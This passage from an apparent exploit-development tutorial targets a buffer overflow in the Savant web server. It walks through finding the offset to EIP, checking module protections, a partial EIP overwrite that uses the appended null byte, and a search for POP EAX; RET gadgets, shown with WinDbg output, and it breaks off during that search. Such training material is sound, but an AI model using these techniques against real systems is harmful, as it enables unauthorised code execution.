We end detecting all the badchars via different methods. <strong>Note that you could have to go back and forth with the different methods as each badchar can make the application behave different.</strong></p>
<p>Now, if we try to obtain the number off bytes that we have to send to overwrite EIP via the <code>msf-pattern_create</code> tool, we obtain that it causes a different access violation in which our instrucction pointer is not ovewritten with an unique value, as we would expect.
We have to <strong>also manually split the buffer using different characters to manually detect the offset by analyzing which value does EIP have.</strong>
If we do that, we will detect that it&rsquo;s 253 bytes prior to the instruction pointer.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#f92672">***</span> WARNING: Unable to verify checksum <span style="color:#66d9ef">for</span> Savant.exe
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span>ffffffff ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>c2bf0 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">21</span>d8b80f edx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> esi<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>c2bf0 edi<span style="color:#f92672">=</span><span style="color:#ae81ff">0041703</span>c
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">42424242</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">89</span>ea1c ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz na po nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00010202</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">42424242</span> <span style="color:#f92672">??</span>              <span style="color:#f92672">???</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> dds esp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">89</span>ea1c  <span style="color:#ae81ff">00434343</span> Savant<span style="color:#f92672">+</span><span style="color:#ae81ff">0x34343</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">89</span>ea20  <span style="color:#ae81ff">04</span><span style="color:#ae81ff">89</span>ea74
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">89</span>ea24  <span style="color:#ae81ff">0041703</span>c Savant<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1703c</span>
</span></span></code></pre></div><p>Again, we only have 3 bytes in ESP so we cannot store our shellcode there. But we have controlled EIP.
Now that we have confirmed that the offset is correct, we need to find a good instruction to overwrite EIP with that will allow us to take control of the execution flow.
Let&rsquo;s use the narly WinDbg extension to list the protections of the loaded modules.
To make our exploit as portable as possible, we need to choose a module that comes with the application. In addition, the module should not be compiled with any protections.
Let’s load the extension and list the protections of all loaded modules:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>nmod
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00400000</span> <span style="color:#ae81ff">00452000</span> Savant               <span style="color:#f92672">/</span>SafeSEH OFF                Savant.exe
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">62f</span><span style="color:#ae81ff">10000</span> <span style="color:#ae81ff">63120000</span> comctl32_62f10000    <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>WinSxS<span style="color:#960050;background-color:#1e0010">\</span>x86_microsoft.windows.common<span style="color:#f92672">-</span>controls_6595b64144ccf1df_6<span style="color:#ae81ff">.0.19041.5678</span>_none_a867ae788670d4c7<span style="color:#960050;background-color:#1e0010">\</span>comctl32.DLL
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">679</span>b0000 <span style="color:#ae81ff">67</span>a45000 TextShaping          <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM32<span style="color:#960050;background-color:#1e0010">\</span>TextShaping.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">69</span>d80000 <span style="color:#ae81ff">69</span>d8e000 winrnr               <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>winrnr.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">69</span>d90000 <span style="color:#ae81ff">69</span>da0000 wshbth               <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>system32<span style="color:#960050;background-color:#1e0010">\</span>wshbth.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6</span>a230000 <span style="color:#ae81ff">6</span>a246000 pnrpnsp              <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>system32<span style="color:#960050;background-color:#1e0010">\</span>pnrpnsp.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6</span>a980000 <span style="color:#ae81ff">6</span>a991000 napinsp              <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>system32<span style="color:#960050;background-color:#1e0010">\</span>napinsp.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6</span>bfd0000 <span style="color:#ae81ff">6</span>c05d000 COMCTL32             <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>WinSxS<span style="color:#960050;background-color:#1e0010">\</span>x86_microsoft.windows.common<span style="color:#f92672">-</span>controls_6595b64144ccf1df_5<span style="color:#ae81ff">.82.19041.4355</span>_none_c0dc01d438beab35<span style="color:#960050;background-color:#1e0010">\</span>COMCTL32.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6</span>c980000 <span style="color:#ae81ff">6</span>c988000 WSOCK32              <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM32<span style="color:#960050;background-color:#1e0010">\</span>WSOCK32.dll
</span></span></code></pre></div><p>The Savant module (main application) does not have any protection. <strong>However, it is mapped at an address that contains a null byte at the start.</strong> Having a null byte in the address space of the module is an issue, as the application will treat our buffer as a string when inserting the instruction in EIP. A null byte is a string terminator. We need a different approach.</p>
<p>Choosing an address of the other modules, which are Microsoft modules, would mean that the exploit is <strong>dependent on whatever version on Windows is installed on our target (as these DLLs probably will change)</strong>. In addition, we also have to deal with another mitigations like ASLR.</p>
<p>To overcome this issue, we will abuse something that we have already discovered: Our buffer is treated as a string and therefore a null byte is added at the end of it. Remember it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> dds esp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">89</span>ea1c  <span style="color:#ae81ff">00434343</span> Savant<span style="color:#f92672">+</span><span style="color:#ae81ff">0x34343</span>
</span></span></code></pre></div><p>This provides us with an interesting opportunity to use a technique known as a <strong>partial EIP overwrite</strong>.
Because the module we want to attack is mapped in an address range that begins with a null byte, we could use the null byte that the application inserts on our buffer as part of our overwrite.</p>
<p>Indeed, if we send as payload only three bytes to overwrite EIP, we still get the same null byte applied:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> dds esp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">89</span>ea1c  <span style="color:#ae81ff">00434343</span> Savant<span style="color:#f92672">+</span><span style="color:#ae81ff">0x34343</span>
</span></span></code></pre></div><p>So we could insert any address inside the Savant module using the null byte that is added in that position. But now we need to decide what instruction we want to redirect the execution flow to. The bad thing is that ESP does not point to our buffer nor any register.</p>
<p>During our initial crash analysis, we noticed that the second DWORD on the stack at the time of the crash points very close to our current stack pointer.
In fact, it always seems to point to the HTTP method, followed by the rest of the data we sent:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> dds esp L2
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>ea1c  <span style="color:#ae81ff">00414141</span> Savant<span style="color:#f92672">+</span><span style="color:#ae81ff">0x14141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>ea20  <span style="color:#ae81ff">0505</span>ea74
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> dc <span style="color:#ae81ff">0505</span>ea74
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>ea74  <span style="color:#ae81ff">00544547</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>  GET.............
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>ea84  <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">4141412f</span> <span style="color:#ae81ff">41414141</span>  ........<span style="color:#f92672">/</span>AAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>ea94  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>eaa4  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>eab4  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>eac4  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>ead4  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>eae4  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span></code></pre></div><p>Our goal then is to find an assembly instruction sequence that redirects the execution flow to this data.
Thinking that this value is the second value in ESP, we could do a POP, RET instruction:
The first POP would remove the first DWORD from the stack.
This would make ESP point to the memory address that contains our buffer starting with the HTTP GET method. After executing the RET instruction, we should be placed right at the beginning of our HTTP method.
Using such an instruction sequence would mean that we will have to execute the assembly instructions generated by the GET method opcodes. Let&rsquo;s see this instructions:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> dds <span style="color:#a6e22e">poi</span>(esp<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea74  <span style="color:#ae81ff">00544547</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea78  <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea7c  <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea80  <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea84  <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea88  <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea8c  <span style="color:#ae81ff">4141412f</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea90  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea94  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea98  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> u <span style="color:#a6e22e">poi</span>(esp<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea74 <span style="color:#ae81ff">47</span>              inc     edi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea75 <span style="color:#ae81ff">45</span>              inc     ebp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea76 <span style="color:#ae81ff">54</span>              push    esp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea77 <span style="color:#ae81ff">0000</span>            add     byte ptr [eax],al
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea79 <span style="color:#ae81ff">0000</span>            add     byte ptr [eax],al
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea7b <span style="color:#ae81ff">0000</span>            add     byte ptr [eax],al
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea7d <span style="color:#ae81ff">0000</span>            add     byte ptr [eax],al
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea7f <span style="color:#ae81ff">0000</span>            add     byte ptr [eax],al
</span></span></code></pre></div><p>The first instructions do not seem to affect the execution flow or generate any access violations. They are INC operations, and a PUSH instruction that pushes ESP to the stack.  The &ldquo;00&rdquo; instructions use the ADD operation, using the memory address of where EAX points. <strong>These instructions could be problematic as they assume that EAX points to a valid memory address.</strong>
Remember that we want to perform the POP, RET operation?
Let&rsquo;s see if the value we want to POP (the top of the stack) is a valid memory address:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>teb
</span></span><span style="display:flex;"><span>TEB at <span style="color:#ae81ff">0025</span><span style="color:#ae81ff">8000</span>
</span></span><span style="display:flex;"><span>    ExceptionList:        <span style="color:#ae81ff">01</span>a3ff60
</span></span><span style="display:flex;"><span>    StackBase:            <span style="color:#ae81ff">01</span>a40000
</span></span><span style="display:flex;"><span>    StackLimit:           <span style="color:#ae81ff">01</span>a3c000
</span></span><span style="display:flex;"><span>    SubSystemTib:         <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    FiberData:            <span style="color:#ae81ff">00001e00</span>
</span></span><span style="display:flex;"><span>    ArbitraryUserPointer: <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Self:                 <span style="color:#ae81ff">0025</span><span style="color:#ae81ff">8000</span>
</span></span><span style="display:flex;"><span>    EnvironmentPointer:   <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    ClientId:             <span style="color:#ae81ff">00000</span>ec0 . <span style="color:#ae81ff">00000</span>cc0
</span></span><span style="display:flex;"><span>    RpcHandle:            <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Tls Storage:          <span style="color:#ae81ff">004</span>c7520
</span></span><span style="display:flex;"><span>    PEB Address:          <span style="color:#ae81ff">00253000</span>
</span></span><span style="display:flex;"><span>    LastErrorValue:       <span style="color:#ae81ff">10038</span>
</span></span><span style="display:flex;"><span>    LastStatusValue:      c0000008
</span></span><span style="display:flex;"><span>    Count Owned Locks:    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    HardErrorMode:        <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> dds esp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span>a3ea1c  <span style="color:#ae81ff">01</span>a3fe00 <span style="color:#75715e">// We are popping this value
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">01</span>a3ea20  <span style="color:#ae81ff">01</span>a3ea74 <span style="color:#75715e">// We want to return here, address of where our payload is stored
</span></span></span></code></pre></div><p>The value that we are popping is inside the StackBase and StackLimit addresses, which means that it is inside the stack! As it is a valid address, we will pop it into EAX so that the instructions that use EAX are valid!
We need to find a POP EAX, RET instructions inside the Savant module. Let&rsquo;s see which instructions are:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>msf<span style="color:#f92672">-</span>nasm_shell
</span></span><span style="display:flex;"><span>nasm <span style="color:#f92672">&gt;</span> pop eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  <span style="color:#ae81ff">58</span>                pop eax                                                                             
</span></span><span style="display:flex;"><span>nasm <span style="color:#f92672">&gt;</span> ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  C3                ret 
</span></span></code></pre></div><p>Let&rsquo;s search for these instructions in the module and pick any of them that does not contain badchars:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> lm m savant
</span></span><span style="display:flex;"><span>Browse full module list
</span></span><span style="display:flex;"><span>start    end        module name
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00400000</span> <span style="color:#ae81ff">00452000</span>   Savant   <span style="color:#a6e22e">C</span> (no symbols)           
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> s <span style="color:#f92672">-</span>b <span style="color:#ae81ff">00400000</span> <span style="color:#ae81ff">00452000</span>   <span style="color:#ae81ff">58</span> c3
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041</span><span style="color:#ae81ff">8674</span>  <span style="color:#ae81ff">58</span> c3 <span style="color:#ae81ff">33</span> c0 c3 <span style="color:#ae81ff">55</span> <span style="color:#ae81ff">8</span>b ec<span style="color:#f92672">-</span><span style="color:#ae81ff">51</span> <span style="color:#ae81ff">51</span> <span style="color:#ae81ff">83</span> <span style="color:#ae81ff">7</span>d <span style="color:#ae81ff">08</span> <span style="color:#ae81ff">00</span> ff <span style="color:#ae81ff">75</span>  X<span style="color:#ae81ff">.3</span>..U..QQ.}...u
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041924f</span>  <span style="color:#ae81ff">58</span> c3 a1 <span style="color:#ae81ff">68</span> a2 <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">56</span><span style="color:#f92672">-</span><span style="color:#ae81ff">83</span> f8 <span style="color:#ae81ff">03</span> <span style="color:#ae81ff">57</span> <span style="color:#ae81ff">75</span> <span style="color:#ae81ff">66</span> <span style="color:#ae81ff">53</span> <span style="color:#ae81ff">33</span>  X..h.D.V...WufS3
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">004194f</span><span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">58</span> c3 <span style="color:#ae81ff">33</span> c0 c3 a1 <span style="color:#ae81ff">68</span> a2<span style="color:#f92672">-</span><span style="color:#ae81ff">44</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">83</span> f8 <span style="color:#ae81ff">03</span> <span style="color:#ae81ff">75</span> <span style="color:#ae81ff">06</span> a1  X<span style="color:#ae81ff">.3</span>...h.D....u..
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041</span><span style="color:#ae81ff">9613</span>  <span style="color:#ae81ff">58</span> c3 a1 <span style="color:#ae81ff">4</span>c a2 <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">8</span>d<span style="color:#f92672">-</span><span style="color:#ae81ff">0</span>c <span style="color:#ae81ff">80</span> a1 <span style="color:#ae81ff">50</span> a2 <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">8</span>d  X..L.D.....P.D..
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041</span>a531  <span style="color:#ae81ff">58</span> c3 <span style="color:#ae81ff">33</span> c0 c3 <span style="color:#ae81ff">83</span> <span style="color:#ae81ff">3</span>d <span style="color:#ae81ff">68</span><span style="color:#f92672">-</span>ae <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">00</span> ff <span style="color:#ae81ff">53</span> <span style="color:#ae81ff">55</span> <span style="color:#ae81ff">56</span> <span style="color:#ae81ff">57</span>  X<span style="color:#ae81ff">.3</span>...<span style="color:#f92672">=</span>h.C..SUVW
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041</span>af7f  <span style="color:#ae81ff">58</span> c3 <span style="color:#ae81ff">8</span>b <span style="color:#ae81ff">65</span> e8 <span style="color:#ae81ff">33</span> db <span style="color:#ae81ff">33</span><span style="color:#f92672">-</span>f6 <span style="color:#ae81ff">83</span> <span style="color:#ae81ff">4</span>d fc ff <span style="color:#ae81ff">3</span>b f3 <span style="color:#ae81ff">74</span>  X..e<span style="color:#ae81ff">.3.3</span>..M..;.t
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041</span>b464  <span style="color:#ae81ff">58</span> c3 <span style="color:#ae81ff">33</span> c0 c3 <span style="color:#ae81ff">55</span> <span style="color:#ae81ff">8</span>b ec<span style="color:#f92672">-</span><span style="color:#ae81ff">83</span> ec <span style="color:#ae81ff">0</span>c <span style="color:#ae81ff">8</span>b <span style="color:#ae81ff">45</span> <span style="color:#ae81ff">0</span>c <span style="color:#ae81ff">53</span> <span style="color:#ae81ff">56</span>  X<span style="color:#ae81ff">.3</span>..U......E.SV
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041</span>b9fa  <span style="color:#ae81ff">58</span> c3 <span style="color:#ae81ff">33</span> c0 c3 <span style="color:#ae81ff">0f</span> b6 <span style="color:#ae81ff">44</span><span style="color:#f92672">-</span><span style="color:#ae81ff">24</span> <span style="color:#ae81ff">04</span> <span style="color:#ae81ff">8</span>a <span style="color:#ae81ff">4</span>c <span style="color:#ae81ff">24</span> <span style="color:#ae81ff">0</span>c <span style="color:#ae81ff">84</span> <span style="color:#ae81ff">88</span>  X<span style="color:#ae81ff">.3</span>....D<span style="color:#960050;background-color:#1e0010">$</span>..L<span style="color:#960050;background-color:#1e0010">$</span>...
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041</span>ba2e  <span style="color:#ae81ff">58</span> c3 <span style="color:#ae81ff">55</span> <span style="color:#ae81ff">8</span>b ec <span style="color:#ae81ff">83</span> ec <span style="color:#ae81ff">18</span><span style="color:#f92672">-</span><span style="color:#ae81ff">53</span> <span style="color:#ae81ff">56</span> <span style="color:#ae81ff">57</span> <span style="color:#ae81ff">6</span>a <span style="color:#ae81ff">19</span> e8 b6 f3  X.U.....SVWj....
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041</span>c49a  <span style="color:#ae81ff">58</span> c3 e8 c6 b9 ff ff <span style="color:#ae81ff">83</span><span style="color:#f92672">-</span>c0 <span style="color:#ae81ff">54</span> c3 <span style="color:#ae81ff">55</span> <span style="color:#ae81ff">8</span>b ec <span style="color:#ae81ff">81</span> ec  X........T.U....
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041</span>cc30  <span style="color:#ae81ff">58</span> c3 <span style="color:#ae81ff">8</span>b <span style="color:#ae81ff">65</span> e8 <span style="color:#ae81ff">33</span> ff <span style="color:#ae81ff">89</span><span style="color:#f92672">-</span><span style="color:#ae81ff">7</span>d dc <span style="color:#ae81ff">83</span> <span style="color:#ae81ff">4</span>d fc ff <span style="color:#ae81ff">8</span>b <span style="color:#ae81ff">5</span>d  X..e<span style="color:#ae81ff">.3</span>..}..M...]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041</span>cce4  <span style="color:#ae81ff">58</span> c3 <span style="color:#ae81ff">8</span>b <span style="color:#ae81ff">65</span> e8 <span style="color:#ae81ff">33</span> ff <span style="color:#ae81ff">33</span><span style="color:#f92672">-</span>db <span style="color:#ae81ff">83</span> <span style="color:#ae81ff">4</span>d fc ff <span style="color:#ae81ff">8</span>b <span style="color:#ae81ff">75</span> d8  X..e<span style="color:#ae81ff">.3.3</span>..M...u.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041</span>eb74  <span style="color:#ae81ff">58</span> c3 <span style="color:#ae81ff">33</span> c0 c3 <span style="color:#ae81ff">55</span> <span style="color:#ae81ff">8</span>b ec<span style="color:#f92672">-</span><span style="color:#ae81ff">83</span> ec <span style="color:#ae81ff">78</span> <span style="color:#ae81ff">8</span>d <span style="color:#ae81ff">45</span> <span style="color:#ae81ff">88</span> <span style="color:#ae81ff">6</span>a <span style="color:#ae81ff">78</span>  X<span style="color:#ae81ff">.3</span>..U....x.E.jx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041f</span>e21  <span style="color:#ae81ff">58</span> c3 <span style="color:#ae81ff">8</span>b <span style="color:#ae81ff">65</span> e8 <span style="color:#ae81ff">33</span> ff <span style="color:#ae81ff">89</span><span style="color:#f92672">-</span><span style="color:#ae81ff">7</span>d d4 <span style="color:#ae81ff">83</span> <span style="color:#ae81ff">4</span>d fc ff <span style="color:#ae81ff">8</span>b <span style="color:#ae81ff">75</span>  X..e<span style="color:#ae81ff">.3</span>..}..M...u
